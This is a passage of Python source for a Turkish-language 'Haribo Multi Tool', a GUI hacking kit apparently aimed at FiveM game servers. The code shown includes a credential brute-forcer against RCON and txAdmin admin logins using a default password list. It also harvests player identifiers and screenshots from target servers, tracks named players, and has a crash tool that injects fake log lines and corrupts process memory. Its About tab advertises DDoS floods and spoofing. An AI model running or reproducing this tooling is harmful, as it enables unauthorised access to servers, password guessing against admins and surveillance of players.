        threading.Thread(target=w,daemon=True).start()
    def _nt_local(self):
        def w():
            self._log(self.nt_log,"??? ipconfig /all ???")
            r=subprocess.run("ipconfig /all",shell=True,capture_output=True,text=True)
            for ln in r.stdout.splitlines():
                if ln.strip():self._log(self.nt_log,f"  {ln}")
        threading.Thread(target=w,daemon=True).start()
    def _nt_arp(self):
        def w():
            self._log(self.nt_log,"??? ARP ???")
            r=subprocess.run("arp -a",shell=True,capture_output=True,text=True)
            for ln in r.stdout.splitlines():
                if ln.strip():self._log(self.nt_log,f"  {ln}")
        threading.Thread(target=w,daemon=True).start()
    def _nt_netstat(self):
        def w():
            self._log(self.nt_log,"??? netstat -ano ???")
            r=subprocess.run("netstat -ano",shell=True,capture_output=True,text=True)
            for ln in r.stdout.splitlines()[:80]:
                if ln.strip():self._log(self.nt_log,f"  {ln}")
        threading.Thread(target=w,daemon=True).start()
    def _tab_about(self,nb):
        f=tk.Frame(nb,bg=BG);nb.add(f,text="  HAKKINDA  ")
        tk.Label(f,text="\n HARIBO MULTI TOOL\n",bg=BG,fg=ACCENT,font=("Consolas",22,"bold")).pack(pady=(30,5))
        tk.Label(f,text="Made By Haribo",bg=BG,fg=YELLOW,font=("Consolas",14,"bold")).pack()
        tk.Label(f,text="",bg=BG).pack(pady=10)
        for lbl,val,clr in [("Tab 1","IP Degistirici  --  Proxy, Adaptor IP, MAC+DHCP spoof",TEXT),("Tab 2","FiveM Tool  --  Sunucu, Oyuncu, Resource, CFX, HWID, Scan",TEXT),("Tab 3","DDoS/Flood  --  UDP | TCP | HTTP | Slowloris | ICMP",RED),("Tab 4","Network  --  GeoIP | Port | Ping | Trace | DNS | Whois | Subnet | Banner",BLUE)]:
            r=tk.Frame(f,bg=BG);r.pack()
            tk.Label(r,text=f"{lbl}:",bg=BG,fg=SUBTEXT,font=("Consolas",10),width=10,anchor="e").pack(side="left")
            tk.Label(r,text=val,bg=BG,fg=clr,font=("Consolas",10,"bold")).pack(side="left",padx=6)
        tk.Label(f,text="\n\n-- Made By Haribo --",bg=BG,fg=ACCENT,font=("Consolas",13,"bold")).pack(pady=20)

    def _tab_crash(self,nb):
        f=tk.Frame(nb,bg=BG);nb.add(f,text='  CRASH TOOL  ')
        tk.Label(f,text='FIVEM CRASH + QUIT TOOL',bg=BG,fg=YELLOW,font=('Consolas',15,'bold')).pack(pady=(14,2))
        tk.Label(f,text='Kendi FiveMine crash at | Quit mesaji yaz | Delayed | Loop modu',bg=BG,fg=SUBTEXT,font=('Consolas',9)).pack()
        sf=self._lf(f,'Crash Ayarlari',YELLOW);sf.pack(fill='x',padx=18,pady=8)
        r1=tk.Frame(sf,bg=BG);r1.pack(fill='x',padx=6,pady=4)
        tk.Label(r1,text='Quit / Crash Mesaji:',bg=BG,fg=TEXT,font=('Consolas',10)).pack(side='left',padx=6)
        self.crash_msg=self._entry(r1,width=38,default='Disconnected by admin.');self.crash_msg.pack(side='left',padx=4)
        r2=tk.Frame(sf,bg=BG);r2.pack(fill='x',padx=6,pady=4)
        tk.Label(r2,text='Gecikme (sn):',bg=BG,fg=TEXT,font=('Consolas',10)).pack(side='left',padx=6)
        self.crash_delay=self._entry(r2,width=8,default='0');self.crash_delay.pack(side='left',padx=4)
        self.crash_loop_var=tk.BooleanVar(value=False)
        tk.Checkbutton(r2,text='Loop (tekrar tekrar crash at)',variable=self.crash_loop_var,bg=BG,fg=TEXT,selectcolor=BG3,activebackground=BG,font=('Consolas',10)).pack(side='left',padx=14)
        self.crash_loop_iv=self._entry(r2,width=6,default='5');self.crash_loop_iv.pack(side='left')
        tk.Label(r2,text='sn arayla',bg=BG,fg=SUBTEXT,font=('Consolas',9)).pack(side='left',padx=4)
        mf=self._lf(f,'Crash Yontemi',YELLOW);mf.pack(fill='x',padx=18,pady=4)
        self.crash_method=tk.StringVar(value='terminate')
        for lbl,val in [
            ('TerminateProcess  -- anlik process kill, crash gibi gorunur','terminate'),
            ('FiveM Log Kill  -- CitizenFX.log mesaj yazar + kill','log_kill'),
            ('Quit Message  -- FiveM localhost API ile disconnect inject','quit_msg'),
            ('Memory Crash  -- access violation ile gercek crash olustur','mem_crash'),
        ]:
            tk.Radiobutton(mf,text=lbl,variable=self.crash_method,value=val,bg=BG,fg=TEXT,selectcolor=BG3,activebackground=BG,font=('Consolas',10)).pack(anchor='w',padx=18,pady=2)
        pf=self._lf(f,'FiveM Process',SUBTEXT);pf.pack(fill='x',padx=18,pady=4)
        pr=tk.Frame(pf,bg=BG);pr.pack(fill='x',padx=6,pady=5)
        self._btn(pr,'FiveM Bul',self._crash_find,color='#333',w=14).pack(side='left',padx=5)
        self.crash_pid_var=tk.StringVar(value='PID: ---')
        tk.Label(pr,textvariable=self.crash_pid_var,bg=BG,fg=GREEN,font=('Consolas',11,'bold')).pack(side='left',padx=10)
        br=tk.Frame(f,bg=BG);br.pack(pady=12)
        self._btn(br,'CRASH AT',self._crash_fire,color=YELLOW,w=22).pack(side='left',padx=10)
        self._btn(br,'LOOP DURDUR',self._crash_stop_loop,color='#2a2a2a',w=16).pack(side='left',padx=5)
        self._btn(br,'TEMIZLE',lambda:(self.crash_log.configure(state='normal'),self.crash_log.delete('1.0','end'),self.crash_log.configure(state='disabled')),color='#1a1a1a',w=12).pack(side='left',padx=5)
        self.crash_log=self._logbox(f,h=10,fg=YELLOW);self.crash_log.pack(fill='both',expand=True,padx=18,pady=(4,14))
        self._crash_looping=False

    def _crash_find(self):
        names=['FiveM5.exe','FiveM.exe','GTA5.exe','fivem.exe','gta5.exe','FiveM_b3095.exe','FiveM_b2845.exe']
        pids=self._crash_get_pids()
        if pids:
            info='  |  '.join(f'{n} PID:{pid}' for pid,n in pids)
            self.crash_pid_var.set(info[:65])
            self._log(self.crash_log,f'Bulundu: {pids}')
        else:
            self.crash_pid_var.set('FiveM calismiyor')
            self._log(self.crash_log,'[!] FiveM process bulunamadi -- once FiveMi ac')

    def _crash_get_pids(self):
        names=['FiveM5.exe','FiveM.exe','GTA5.exe','fivem.exe','gta5.exe','FiveM_b3095.exe','FiveM_b2845.exe','FiveM_GTAProcess.exe']
        pids=[]
        try:
            r=subprocess.run('tasklist /fo csv /nh',shell=True,capture_output=True,text=True)
            for ln in r.stdout.splitlines():
                p=ln.strip().strip('"').split('","')
                if len(p)>=2 and p[0] in names:
                    try:pids.append((int(p[1]),p[0]))
                    except:pass
        except:pass
        return pids

    def _crash_write_log(self,msg):
        paths=[
            os.path.expandvars(r'%localappdata%\FiveM\FiveM.app\logs\CitizenFX.log'),
            os.path.expandvars(r'%localappdata%\FiveM\FiveM.app\CitizenFX.log'),
            os.path.expandvars(r'%appdata%\CitizenFX\CitizenFX.log'),
        ]
        for path in paths:
            if os.path.exists(path):
                try:
                    with open(path,'a',encoding='utf-8') as fh:
                        fh.write(f'\n[DISCONNECT] Reason: {msg}\n[CRASH] FiveM crashed.\n')
                    self._log(self.crash_log,f'[OK] Log yazildi: {path}')
                    return path
                except:pass
        self._log(self.crash_log,'[!] CitizenFX.log bulunamadi')
        return None

    def _crash_do(self):
        delay=0.0
        try:delay=float(self.crash_delay.get().strip())
        except:pass
        if delay>0:
            self._log(self.crash_log,f'[...] {delay}s gecikme...')
            time.sleep(delay)
        method=self.crash_method.get()
        msg=self.crash_msg.get().strip() or 'Disconnected.'
        pids=self._crash_get_pids()
        if not pids:
            self._log(self.crash_log,'[ERR] FiveM calismiyor -- once oyunu ac');return
        self._log(self.crash_log,f'Hedef:{pids}  Metod:{method}  Mesaj:{msg}')
        if method=='log_kill':
            self._crash_write_log(msg)
        elif method=='quit_msg':
            for port in [13172,30120]:
                try:
                    requests.post(f'http://localhost:{port}/api/disconnect',json={'reason':msg},timeout=1)
                    self._log(self.crash_log,f'[OK] Disconnect inject edildi (port {port}): {msg}')
                except:pass
            time.sleep(0.4)
        elif method=='mem_crash':
            PROCESS_ALL_ACCESS=0x1F0FFF
            for pid,name in pids:
                try:
                    h=ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS,False,pid)
                    if h:
                        bad=ctypes.c_void_p(0x1)
                        buf=(ctypes.c_char*8)(b'A'[0])
                        written=ctypes.c_size_t(0)
                        ctypes.windll.kernel32.WriteProcessMemory(h,bad,buf,8,ctypes.byref(written))
                        ctypes.windll.kernel32.CloseHandle(h)
                        self._log(self.crash_log,f'[OK] Memory crash -> {name} PID:{pid}')
                except Exception as e:
                    self._log(self.crash_log,f'[!] mem: {e}')
            time.sleep(0.3)
        PROCESS_TERMINATE=0x0001
        for pid,name in pids:
            try:
                h=ctypes.windll.kernel32.OpenProcess(PROCESS_TERMINATE,False,pid)
                if h:
                    ctypes.windll.kernel32.TerminateProcess(h,0xDEAD)
                    ctypes.windll.kernel32.CloseHandle(h)
                    self._log(self.crash_log,f'[CRASH] {name} PID:{pid} -- CRASHLANDI')
                else:
                    subprocess.run(f'taskkill /F /PID {pid}',shell=True,capture_output=True)
                    self._log(self.crash_log,f'[CRASH] {name} PID:{pid} -- taskkill ile kapatildi')
            except Exception as e:
                self._log(self.crash_log,f'[ERR] {pid}: {e}')

    def _crash_fire(self):
        if self.crash_loop_var.get():
            self._crash_looping=True
            self._log(self.crash_log,'Loop modu aktif -- FiveM her acildiginda crash atacak')
            threading.Thread(target=self._crash_loop_worker,daemon=True).start()
        else:
            threading.Thread(target=self._crash_do,daemon=True).start()

    def _crash_loop_worker(self):
        try:iv=float(self.crash_loop_iv.get().strip())
        except:iv=5.0
        while self._crash_looping:
            pids=self._crash_get_pids()
            if pids:
                self._log(self.crash_log,'[LOOP] FiveM bulundu -- crash atiliyor...')
                self._crash_do()
            else:
                self._log(self.crash_log,'[LOOP] FiveM bekleniyor...')
            time.sleep(iv)

    def _crash_stop_loop(self):
        self._crash_looping=False
        self._log(self.crash_log,'[STOP] Loop durduruldu')

    def _tab_intel(self,nb):
        f=tk.Frame(nb,bg=BG);nb.add(f,text='  SERVER INTEL  ')
        tk.Label(f,text='SERVER INTELLIGENCE',bg=BG,fg='#aa44ff',font=('Consolas',15,'bold')).pack(pady=(14,2))
        tk.Label(f,text='Full dump | Vuln scan | txAdmin | RCON brute | Framework detect | CFX browser | Endpoint map',bg=BG,fg=SUBTEXT,font=('Consolas',9)).pack(pady=(0,5))
        pw=tk.PanedWindow(f,orient='horizontal',bg=BG,sashwidth=4);pw.pack(fill='both',expand=True,padx=8,pady=4)
        left=tk.Frame(pw,bg=BG,width=310);pw.add(left,minsize=280)
        sf=self._lf(left,'Hedef Sunucu','#aa44ff');sf.pack(fill='x',padx=4,pady=4)
        self.intel_server=self._entry(sf,width=30,default='1.2.3.4:30120');self.intel_server.pack(padx=6,pady=4)
        rf=self._lf(left,'RCON Brute Wordlist',YELLOW);rf.pack(fill='x',padx=4,pady=4)
        self.intel_rcon_wl=self._entry(rf,width=30,default='admin,password,rcon,1234,changeme,fivem');self.intel_rcon_wl.pack(padx=6,pady=3)
        tk.Label(rf,text='(virgullu liste veya dosya yolu)',bg=BG,fg=SUBTEXT,font=('Consolas',8)).pack(anchor='w',padx=6)
        btns=[
            ('FULL SERVER DUMP',  self._intel_full,     '#aa44ff'),
            ('VULN TARAYICI',     self._intel_vuln,     '#880000'),
            ('txAdmin Detector',  self._intel_txadmin,  '#884400'),
            ('Framework Detect',  self._intel_framework,'#334488'),
            ('RCON Bruteforce',   self._intel_rcon,     '#660066'),
            ('Endpoint Map',      self._intel_endpoints,'#004466'),
            ('Resource Analizi',  self._intel_rescat,   '#335500'),
            ('CFX Server Browser',self._intel_cfx_browse,'#003366'),
            ('Dynamic.json Dump', self._intel_dynamic,  '#553300'),
            ('Tum ConVars',       self._intel_allvars,  '#224422'),
            ('Screenshot Kontrol',self._intel_screenshot,'#332244'),
            ('Export JSON',       self._intel_export,   '#224444'),
        ]
        for lbl,cmd,col in btns:
            self._btn(left,lbl,cmd,color=col,w=30).pack(fill='x',padx=4,pady=2)
        right=tk.Frame(pw,bg=BG);pw.add(right,minsize=420)
        hdr=tk.Frame(right,bg=BG);hdr.pack(fill='x',padx=5,pady=(4,1))
        tk.Label(hdr,text='INTEL CIKTI',bg=BG,fg='#aa44ff',font=('Consolas',10,'bold')).pack(side='left')
        self._btn(hdr,'Temizle',lambda:(self.intel_log.configure(state='normal'),self.intel_log.delete('1.0','end'),self.intel_log.configure(state='disabled')),color='#1a1a1a',w=10).pack(side='right',padx=4)
        self.intel_log=self._logbox(right,fg='#aa44ff');self.intel_log.pack(fill='both',expand=True,padx=5,pady=4)
        self._intel_data={}

    def _intel_ip(self):
        raw=self.intel_server.get().strip()
        if not raw:return None,None
        p=raw.split(':');return p[0],int(p[1]) if len(p)>1 else 30120

    def _intel_full(self):
        def w():
            h,p=self._intel_ip()
            if not h:self._log(self.intel_log,'[ERR] IP:Port gir');return
            self._log(self.intel_log,'='*55)
            self._log(self.intel_log,f' FULL DUMP: {h}:{p}')
            self._log(self.intel_log,'='*55)
            base=f'http://{h}:{p}'
            for name,ep in [('info.json','/info.json'),('players.json','/players.json'),('dynamic.json','/dynamic.json')]:
                try:
                    r=requests.get(base+ep,timeout=6)
                    if r.status_code==200:
                        d=r.json();self._intel_data[name]=d
                        self._log(self.intel_log,f'[{name}] HTTP 200')
                        if name=='info.json':
                            v=d.get('vars',{})
                            for k,val in list(v.items())[:20]:self._log(self.intel_log,f'  {k}: {val}')
                            res=d.get('resources',[])
                            self._log(self.intel_log,f'  RESOURCES ({len(res)}): '+', '.join(res[:10])+'...')
                        elif name=='players.json':
                            self._log(self.intel_log,f'  Oyuncu: {len(d)}')
                            for x in d[:8]:
                                self._log(self.intel_log,f'  [{x.get("id")}] {x.get("name")} ping:{x.get("ping")}ms')
                                for ident in x.get('identifiers',[]):self._log(self.intel_log,f'      {ident}')
                        elif name=='dynamic.json':
                            for k,val in d.items():self._log(self.intel_log,f'  {k}: {val}')
                    else:self._log(self.intel_log,f'[{name}] HTTP {r.status_code}')
                except Exception as e:self._log(self.intel_log,f'[{name}] ERR: {e}')
            self._log(self.intel_log,'='*55)
        threading.Thread(target=w,daemon=True).start()

    def _intel_vuln(self):
        def w():
            h,p=self._intel_ip()
            if not h:self._log(self.intel_log,'[ERR] IP:Port gir');return
            self._log(self.intel_log,f'VULN TARAMA: {h}:{p}');score=0
            try:
                info=requests.get(f'http://{h}:{p}/info.json',timeout=5).json()
                v=info.get('vars',{})
                if not v.get('sv_licenseKey') or v.get('sv_licenseKey')=='<replace>':
                    self._log(self.intel_log,'[VULN] sv_licenseKey bos/varsayilan!');score+=20
                if str(v.get('sv_debugMode','')).lower() in ['true','1']:
                    self._log(self.intel_log,'[VULN] sv_debugMode=true -- RCE riski!');score+=30
                if str(v.get('sv_scriptHookAllowed','')).lower() in ['true','1']:
                    self._log(self.intel_log,'[VULN] sv_scriptHookAllowed=true -- native inject!');score+=25
                res=info.get('resources',[])
                dangerous=['mellotrainer','trainerv','scripthookv','mapeditor']
                bad=[r for r in res if any(d in r.lower() for d in dangerous)]
                if bad:self._log(self.intel_log,f'[VULN] Tehlikeli resource: {bad}');score+=20
            except Exception as e:self._log(self.intel_log,f'[ERR] info.json: {e}')
            for ep in ['/dynamic.json','/players.json']:
                try:
                    r=requests.get(f'http://{h}:{p}{ep}',timeout=3)
                    if r.status_code==200:self._log(self.intel_log,f'[OPEN] {ep} herkese acik')
                except:pass
            for txport in [40120,p]:
                try:
                    r=requests.get(f'http://{h}:{txport}/api/serverlog',timeout=2)
                    if r.status_code in [200,401,403]:
                        self._log(self.intel_log,f'[VULN] txAdmin port:{txport} HTTP:{r.status_code}');score+=25
                except:pass
            self._log(self.intel_log,f'RISK SKORU: {score}/100 -- {"KRITIK" if score>=50 else "ORTA" if score>=25 else "DUSUK"}')
        threading.Thread(target=w,daemon=True).start()

    def _intel_txadmin(self):
        def w():
            h,p=self._intel_ip()
            if not h:return
            self._log(self.intel_log,f'txAdmin tespiti: {h}')
            for port in [40120,p,8080]:
                for ep in ['/api/serverlog','/auth/login','/','/api/status','/api/players']:
                    try:
                        r=requests.get(f'http://{h}:{port}{ep}',timeout=2)
                        if r.status_code in [200,401,403,302]:
                            self._log(self.intel_log,f'  [HIT] :{port}{ep} HTTP:{r.status_code}')
                            if 'txAdmin' in r.text or 'txadmin' in r.text.lower():
                                self._log(self.intel_log,f'  [txADMIN ONAYLANDI] :{port}')
                    except:pass
        threading.Thread(target=w,daemon=True).start()

    def _intel_framework(self):
        def w():
            h,p=self._intel_ip()
            if not h:return
            try:
                data=requests.get(f'http://{h}:{p}/info.json',timeout=6).json()
                res=data.get('resources',[])
                fws={
                    'ESX':['es_extended','esx_legacy','essentialmode'],
                    'QBCore':['qb-core','qb-hud','qb-inventory'],
                    'vRP':['vrp','vrpex'],
                    'Ox (Overextended)':['ox_core','ox_inventory','ox_lib'],
                    'txAdmin':['monitor','txAdminClient'],
                }
                self._log(self.intel_log,'--- Framework Analizi ---')
                for fw,keys in fws.items():
                    found=[r for r in res if any(k.lower() in r.lower() for k in keys)]
                    if found:self._log(self.intel_log,f'  [DETECT] {fw}: {found[:4]}')
                custom=[r for r in res if not any(k in r.lower() for k in ['esx','qb','vrp','ox','monitor','spawnmanager','mapmanager','sessionmanager','hardcap','chat'])]
                self._log(self.intel_log,f'  Ozel resource: {len(custom)} adet -- {custom[:6]}')
            except Exception as e:self._log(self.intel_log,f'[ERR] {e}')
        threading.Thread(target=w,daemon=True).start()

    def _intel_rcon(self):
        def w():
            h,p=self._intel_ip()
            if not h:return
            raw=self.intel_rcon_wl.get().strip()
            if os.path.exists(raw):
                with open(raw,encoding='utf-8',errors='ignore') as fp:
                    passwords=[l.strip() for l in fp if l.strip()]
            else:
                passwords=[x.strip() for x in raw.split(',') if x.strip()]
            extra=['','admin','password','rcon','123456','fivem','server','changeme','rcon123','root','qwerty','letmein','1234','admin123']
            passwords=list(dict.fromkeys(passwords+extra))
            self._log(self.intel_log,f'RCON Brute: {h}:{p} | {len(passwords)} parola')
            found=False
            for pwd in passwords:
                if found:break
                try:
                    r=requests.post(f'http://{h}:{p}/api/rcon',json={'command':'echo HariboTest','password':pwd},timeout=3)
                    if r.status_code==200 and 'error' not in r.text.lower():
                        self._log(self.intel_log,f'[FOUND] RCON: "{pwd}"');found=True
                except:pass
                try:
                    r2=requests.post(f'http://{h}:40120/auth/login',data={'username':'admin','password':pwd},timeout=2,allow_redirects=False)
                    if r2.status_code in [200,302] and 'wrong' not in r2.text.lower() and len(r2.text)>100:
                        self._log(self.intel_log,f'[FOUND] txAdmin admin:{pwd}');found=True
                except:pass
            if not found:self._log(self.intel_log,'[--] Parola bulunamadi')
        threading.Thread(target=w,daemon=True).start()

    def _intel_endpoints(self):
        def w():
            h,p=self._intel_ip()
            if not h:return
            self._log(self.intel_log,f'Endpoint tarama: {h}:{p}')
            eps=[
                '/info.json','/players.json','/dynamic.json','/server-list.json',
                '/favicon.ico','/__resource.lua','/fxmanifest.lua',
                '/api/status','/api/players','/api/serverlog','/api/resources',
                '/monitor','/admin','/txAdmin','/auth/login',
                '/socket.io/','/cfx-nui/loading/html/index.html',
            ]
            open_eps=[]
            for ep in eps:
                try:
                    r=requests.get(f'http://{h}:{p}{ep}',timeout=2)
                    st=r.status_code;sz=len(r.content)
                    if st in [200,301,302]:open_eps.append(ep);self._log(self.intel_log,f'  [OPEN] {ep} HTTP:{st} {sz}B')
                    elif st in [401,403]:self._log(self.intel_log,f'  [AUTH] {ep} HTTP:{st}')
                except:pass
            self._log(self.intel_log,f'Bitti -- {len(open_eps)} acik endpoint')
        threading.Thread(target=w,daemon=True).start()

    def _intel_rescat(self):
        def w():
            h,p=self._intel_ip()
            if not h:return
            try:
                data=requests.get(f'http://{h}:{p}/info.json',timeout=6).json()
                res=data.get('resources',[])
                cats={
                    'Veritabani':['mysql','oxmysql','ghmatti'],
                    'AntiCheat':['anticheat','ac_','battleye'],
                    'Admin':['admin','staff','txadmin','monitor'],
                    'Ekonomi':['shop','bank','atm','money','economy'],
                    'Arac':['vehicle','car','garage','mechanic'],
                    'Harita':['map','mlo','interior','ymap'],
                    'UI/HUD':['hud','ui','menu','nui','radial'],
                }
                self._log(self.intel_log,f'Resource Kategorileri ({len(res)} adet)')
                self._log(self.intel_log,'-'*50)
                for cat,keys in cats.items():
                    found=[r for r in res if any(k.lower() in r.lower() for k in keys)]
                    if found:
                        self._log(self.intel_log,f'  [{cat}] {len(found)} adet')
                        for r in found[:5]:self._log(self.intel_log,f'    {r}')
            except Exception as e:self._log(self.intel_log,f'[ERR] {e}')
        threading.Thread(target=w,daemon=True).start()

    def _intel_cfx_browse(self):
        def w():
            self._log(self.intel_log,'CFX Server List cekiliyor...')
            try:
                r=requests.get('https://servers-frontend.fivem.net/api/servers/',timeout=12)
                servers=r.json().get('servers',[])
                servers_sorted=sorted(servers,key=lambda x:x.get('Data',{}).get('clients',0),reverse=True)
                self._log(self.intel_log,f'Toplam: {len(servers)} sunucu -- Top 25:')
                self._log(self.intel_log,'-'*55)
                for s in servers_sorted[:25]:
                    d=s.get('Data',{});v=d.get('vars',{})
                    ep=d.get('connectEndPoints',['?'])
                    name=v.get('sv_projectName',d.get('hostname','?'))[:35]
                    clients=d.get('clients',0);maxcl=d.get('sv_maxclients',0)
                    locale=v.get('locale','??');ip=ep[0] if ep else '?'
                    self._log(self.intel_log,f'  {clients:>3}/{maxcl:<3} [{locale}] {name}')
                    self._log(self.intel_log,f'         IP: {ip}')
                self._log(self.intel_log,'-'*55)
            except Exception as e:self._log(self.intel_log,f'[ERR] {e}')
        threading.Thread(target=w,daemon=True).start()

    def _intel_dynamic(self):
        def w():
            h,p=self._intel_ip()
            if not h:return
            try:
                d=requests.get(f'http://{h}:{p}/dynamic.json',timeout=5).json()
                self._log(self.intel_log,'--- dynamic.json ---')
                for k,v in d.items():self._log(self.intel_log,f'  {k}: {v}')
            except Exception as e:self._log(self.intel_log,f'[ERR] {e}')
        threading.Thread(target=w,daemon=True).start()

    def _intel_allvars(self):
        def w():
            h,p=self._intel_ip()
            if not h:return
            try:
                data=requests.get(f'http://{h}:{p}/info.json',timeout=6).json()
                v=data.get('vars',{})
                self._log(self.intel_log,f'Tum ConVars ({len(v)})')
                for k,val in sorted(v.items()):self._log(self.intel_log,f'  {k}: {val}')
            except Exception as e:self._log(self.intel_log,f'[ERR] {e}')
        threading.Thread(target=w,daemon=True).start()

    def _intel_screenshot(self):
        def w():
            h,p=self._intel_ip()
            if not h:return
            for ep in ['/api/screenshot','/screenshot','/api/screen','/screen.jpg','/screen.png']:
                try:
                    r=requests.get(f'http://{h}:{p}{ep}',timeout=3)
                    ct=r.headers.get('content-type','')
                    if r.status_code==200:
                        self._log(self.intel_log,f'  [OPEN] {ep} {ct} {len(r.content)}B')
                        if 'image' in ct:
                            fn=f'ss_{h}_{int(time.time())}.jpg'
                            with open(fn,'wb') as fp:fp.write(r.content)
                            self._log(self.intel_log,f'  [SAVED] {fn}')
                    else:self._log(self.intel_log,f'  [-] {ep} HTTP:{r.status_code}')
                except:pass
        threading.Thread(target=w,daemon=True).start()

    def _intel_export(self):
        def w():
            h,p=self._intel_ip()
            if not h:return
            import json as jl;result={}
            for ep,key in [('/info.json','info'),('/players.json','players'),('/dynamic.json','dynamic')]:
                try:
                    r=requests.get(f'http://{h}:{p}{ep}',timeout=5)
                    if r.status_code==200:result[key]=r.json()
                except:pass
            fn=f'intel_{h.replace(".","_")}_{p}_{int(time.time())}.json'
            with open(fn,'w',encoding='utf-8') as fp:jl.dump(result,fp,indent=2,ensure_ascii=False)
            self._log(self.intel_log,f'[OK] Export: {fn}')
        threading.Thread(target=w,daemon=True).start()

    def _tab_monitor(self,nb):
        f=tk.Frame(nb,bg=BG);nb.add(f,text='  MONITOR  ')
        tk.Label(f,text='REAL-TIME SERVER MONITOR',bg=BG,fg=GREEN,font=('Consolas',15,'bold')).pack(pady=(14,2))
        tk.Label(f,text='Canli oyuncu grafigi | Join/Leave alert | Oyuncu izle | Uptime takip',bg=BG,fg=SUBTEXT,font=('Consolas',9)).pack(pady=(0,5))
        top=tk.Frame(f,bg=BG3);top.pack(fill='x',padx=18,pady=5)
        tk.Label(top,text='  Sunucu IP:Port:',bg=BG3,fg=SUBTEXT,font=('Consolas',10)).grid(row=0,column=0,padx=8,pady=8,sticky='w')
        self.mon_server=self._entry(top,width=22,default='1.2.3.4:30120');self.mon_server.grid(row=0,column=1,padx=4)
        tk.Label(top,text='Aralik(sn):',bg=BG3,fg=SUBTEXT,font=('Consolas',10)).grid(row=0,column=2,padx=8)
        self.mon_interval=self._entry(top,width=6,default='10');self.mon_interval.grid(row=0,column=3,padx=4)
        tk.Label(top,text='Izle(oyuncu):',bg=BG3,fg=SUBTEXT,font=('Consolas',10)).grid(row=0,column=4,padx=8)
        self.mon_watch=self._entry(top,width=16,default='');self.mon_watch.grid(row=0,column=5,padx=4)
        self.mon_running=False;self._mon_history=[];self._mon_players_prev=set()
        self._mon_peak=0;self._mon_start_time=None
        stat=tk.Frame(f,bg=BG3);stat.pack(fill='x',padx=18,pady=4)
        self.mon_count_v=tk.StringVar(value='0');self.mon_max_v=tk.StringVar(value='0')
        self.mon_peak_v=tk.StringVar(value='0');self.mon_uptime_v=tk.StringVar(value='00:00:00')
        self.mon_status_v=tk.StringVar(value='BEKLIYOR')
        for col,(lbl,var,clr) in enumerate([('Oyuncu:',self.mon_count_v,GREEN),('Max:',self.mon_max_v,YELLOW),('Peak:',self.mon_peak_v,ACCENT),('Uptime:',self.mon_uptime_v,BLUE),('Durum:',self.mon_status_v,GREEN)]):
            tk.Label(stat,text=f'  {lbl}',bg=BG3,fg=SUBTEXT,font=('Consolas',10)).grid(row=0,column=col*2,padx=10,pady=8,sticky='w')
            tk.Label(stat,textvariable=var,bg=BG3,fg=clr,font=('Consolas',12,'bold')).grid(row=0,column=col*2+1,padx=4,sticky='w')
        gf=tk.LabelFrame(f,text=' Oyuncu Grafigi (ASCII) ',bg=BG,fg=GREEN,font=('Consolas',9,'bold'),bd=1)
        gf.pack(fill='x',padx=18,pady=4)
        self.mon_graph=tk.Label(gf,text='[ Monitor baslatilmadi ]',bg=BG,fg=GREEN,font=('Consolas',8),justify='left',anchor='w')
        self.mon_graph.pack(fill='x',padx=5,pady=4)
        br=tk.Frame(f,bg=BG);br.pack(pady=8)
        self._btn(br,'MONITOR BASLAT',self._mon_start,color=GREEN,w=22).pack(side='left',padx=10)
        self._btn(br,'DURDUR',self._mon_stop,color='#2a2a2a',w=14).pack(side='left',padx=5)
        self._btn(br,'SNAPSHOT',self._mon_snapshot,color='#003366',w=14).pack(side='left',padx=5)
        self._btn(br,'PLAYER LIST',self._mon_now,color='#333',w=14).pack(side='left',padx=5)
        self.mon_log=self._logbox(f,h=8,fg=GREEN);self.mon_log.pack(fill='both',expand=True,padx=18,pady=(4,14))

    def _mon_ip(self):
        raw=self.mon_server.get().strip()
        if not raw:return None,None
        p=raw.split(':');return p[0],int(p[1]) if len(p)>1 else 30120

    def _mon_start(self):
        if self.mon_running:self._log(self.mon_log,'[!] Zaten calisiyor');return
        h,p=self._mon_ip()
        if not h:self._log(self.mon_log,'[ERR] IP:Port gir');return
        self.mon_running=True;self._mon_start_time=time.time()
        self._mon_history=[];self._mon_peak=0;self._mon_players_prev=set()
        self.mon_status_v.set('IZLENIYOR');self._log(self.mon_log,f'Monitor basladi: {h}:{p}')
        threading.Thread(target=self._mon_worker,args=(h,p),daemon=True).start()

    def _mon_worker(self,h,p):
        try:iv=max(2,int(self.mon_interval.get()))
        except:iv=10
        watch=self.mon_watch.get().strip().lower()
        while self.mon_running:
            try:
                r=requests.get(f'http://{h}:{p}/players.json',timeout=4)
                players=r.json() if r.status_code==200 else []
                count=len(players);current={x.get('name','') for x in players}
                if count>self._mon_peak:self._mon_peak=count;self.mon_peak_v.set(str(count))
                self.mon_count_v.set(str(count))
                try:
                    info=requests.get(f'http://{h}:{p}/info.json',timeout=3).json()
                    self.mon_max_v.set(str(info.get('vars',{}).get('sv_maxClients','?')))
                except:pass
                elapsed=int(time.time()-self._mon_start_time)
                h2,m2,s2=elapsed//3600,(elapsed%3600)//60,elapsed%60
                self.mon_uptime_v.set(f'{h2:02d}:{m2:02d}:{s2:02d}')
                for name in current-self._mon_players_prev:
                    self._log(self.mon_log,f'[JOIN] {name}')
                    if watch and watch in name.lower():
                        self._log(self.mon_log,f'[ALERT] Izlenen katildi: {name}')
                for name in self._mon_players_prev-current:
                    self._log(self.mon_log,f'[LEAVE] {name}')
                    if watch and watch in name.lower():
                        self._log(self.mon_log,f'[ALERT] Izlenen ayrildi: {name}')
                self._mon_players_prev=current
                self._mon_history.append(count)
                if len(self._mon_history)>60:self._mon_history.pop(0)
                self._mon_draw()
                self.mon_status_v.set('AKTIF')
            except Exception as e:
                self.mon_status_v.set('OFFLINE');self._log(self.mon_log,f'[ERR] {e}')
            time.sleep(iv)

    def _mon_draw(self):
        if not self._mon_history:return
        hist=self._mon_history[-40:]
        peak=max(hist) if max(hist)>0 else 1
        H=8;rows=[]
        for row in range(H,0,-1):
            thr=peak*row/H
            rows.append(f'{int(thr):>3} '+''.join('|' if v>=thr else ' ' for v in hist))
        rows.append('    '+chr(9472)*len(hist))
        rows.append(f'    (son {len(hist)} olcum, her {self.mon_interval.get()}sn)')
        self.mon_graph.configure(text='\n'.join(rows))

    def _mon_stop(self):
        self.mon_running=False
        self.mon_status_v.set('DURDURULDU')
        self._log(self.mon_log,'Monitor durduruldu')

    def _mon_snapshot(self):
        def w():
            h,p=self._mon_ip()
            if not h:return
            try:
                players=requests.get(f'http://{h}:{p}/players.json',timeout=4).json()
                info=requests.get(f'http://{h}:{p}/info.json',timeout=4).json()
                v=info.get('vars',{})
                self._log(self.mon_log,'=== SNAPSHOT ===')
